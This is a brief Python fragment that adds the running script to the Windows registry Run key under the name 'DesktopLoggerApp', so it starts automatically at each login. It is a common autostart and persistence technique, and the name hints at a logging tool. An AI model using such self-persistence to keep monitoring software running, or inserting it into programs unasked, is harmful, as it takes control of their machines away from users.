import os
import sys
import winreg as reg

def add_to_startup():
    pth = os.path.abspath(sys.argv[0])
    key = reg.HKEY_CURRENT_USER
    key_value = r'Software\Microsoft\Windows\CurrentVersion\Run'
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, "DesktopLoggerApp", 0, reg.REG_SZ, pth)
    reg.CloseKey(open_key)